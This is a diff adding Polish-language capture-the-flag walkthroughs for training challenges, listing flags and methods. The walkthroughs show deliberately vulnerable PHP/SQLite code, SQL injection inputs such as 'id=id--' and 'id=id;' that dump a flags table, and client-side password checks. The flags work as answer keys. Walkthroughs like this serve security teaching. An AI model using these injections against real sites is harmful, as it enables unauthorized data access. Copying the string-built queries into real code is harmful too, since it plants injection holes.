@@ -140,9 +140,32 @@
 
 
 
+### [Proste](http://training.securitum.com/rozwal/gim/gimnazjum1/)
+
+[Rozwiązanie](http://training.securitum.com/rozwal/gim/gimnazjum1/?id=id): _ZjazdGimboli_
+
+**Metoda**:
+
+1. Otworzyć źródło strony, w którym można znaleźć:
+    
+    ```php
+    <!--?php readfile(__FILE__);
+    $db= new SQLite3('db.db');
+    $res = $db--->
+    
+    query('SELECT name FROM flags WHERE id='.$_GET['id']);
+    while($r=$res-&gt;fetchArray()) {
+	    echo $r['name'];
+    }
+    ```
+
+2. W zapytaniu wstrzykujemy parametr `id=id`.
+
+
+
 ### [Nie takie trudne](http://training.securitum.com/rozwal/gim/gimnazjum2/)
 
-[Rozwiązanie](http://training.securitum.com/rozwal/gim/gimnazjum2/?id=3): _ZjazdGimboli_
+[Rozwiązanie](http://training.securitum.com/rozwal/gim/gimnazjum2/?id=id--): _OdZjazduGimboliGlowaBoli_
 
 **Metoda**:
 
@@ -169,8 +192,91 @@
    
    [http://training.securitum.com/rozwal/gim/gimnazjum2/?id=3](http://training.securitum.com/rozwal/gim/gimnazjum2/?id=3)
    
+ 3. Wszystkie flagi można wykraść wstrzymując w parametrze zapytania `id=id--`.
+    
+    Otrzymany rezultat:
+    ```
+    ROZWAL_NIE_TEN_FORMATROZWAL_{ZjazdGimboli}ROZWAL_{ZjazdGimboli}ROZWAL_{ZjazdGimboli}ROZWAL_{ZjazdGimboli}ROZWAL_{ZjazdGimboli}ROZWAL_{OdZjazduGimboliGlowaBoli}
+    ```
  
 
+### [Trochę ciężej](http://training.securitum.com/rozwal/gim/gimnazjum3/)
+
+[Rozwiązanie](http://training.securitum.com/rozwal/gim/gimnazjum3/?id=id;): _SelectNameFromGimbus_
+
+**Metoda**:
+
+1. Ze źródła strony:
+
+    ```php
+    <!--?php
+    readfile(__FILE__);
+    $db= new SQLite3('db.db');
+    $_GET['id'] = str_replace(array('-','*'),'',$_GET['id']);
+    $res = $db--->
+    
+    query('SELECT name FROM flags WHERE id='.$_GET['id'].' LIMIT 1');
+    while($r=$res-&gt;fetchArray()) {
+	    echo $r['name'];
+    }
+    ```
+    
+    Tym razem nie jest możliwe dodanie komentarza w SQL (`--`), ponieważ taki ciąg jest podmieniany na `**`.
+    
+2. Wstrzyknąć `id=id;`. Średnik kończy zapytanie SQLowe, przez co zwracany jest wynik bez ograniczenia do 1.
+
+    ```
+    ROZWAL_NIE_TEN_FORMATROZWAL_{ZjazdGimboli}ROZWAL_{ZjazdGimboli}ROZWAL_{ZjazdGimboli}ROZWAL_{ZjazdGimboli}ROZWAL_{ZjazdGimboli}ROZWAL_{OdZjazduGimboliGlowaBoli}ROZWAL_{OdZjazduGimboliGlowaBoli}ROZWAL_{OdZjazduGimboliGlowaBoli}ROZWAL_{SelectNameFromGimbus}
+    ```
+
+
+
+
+## [Zerówka](https://stary.rozwal.to/zadanie/11)
+
+
+
+### [Jak tego nie rozwalisz - usuń konto](http://training.securitum.com/rozwal/zerowka/zerowka_1.php)
+
+**Rozwiązanie**: _DontMessWithZohan_
+
+**Metoda**:
+
+1. Ze źródła strony: `<!-- ROZWAL_{DontMessWithZohan}-->`
+
+
+
+### [ha ha ;)](http://training.securitum.com/rozwal/zerowka/zerowka_2.php)
+
+**Rozwiązanie**: _DontMessWithZohan2_
+
+**Metoda**:
+
+1. Wpisać cokolwiek z pole tekstowe i kliknąć "Zaloguj".
+
+2. Po przeniesieniu na 404 cofnąć stronę w przeglądarce.
+
+3. Zajrzeć w źródło strony. Sieć > zerowka_2.php.
+   W odpowiedzi z serwera podany jest parametr:
+   `Flag: ROZWAL_{DontMessWithZohan2}`
+
+
+
+### [Typowa flaga za 1p.](http://training.securitum.com/rozwal/zerowka/zerowka_5.php)
+
+**Rozwiązanie**: _ILikeBiscuits_
+
+**Metoda**:
+
+1. W źródle strony, w drugim z załączonych skryptów w HTMLu jest napisane hasło.
+
+   ```javascript
+   function checkPassword() {
+	   if (document.getElementById("password").value == "realpassword") {
+		   alert('ROZWAL_{ILikeBiscuits}');
+	   }
+    }
+   ```
 
 
 [1]: https://en.wikipedia.org/wiki/Base64
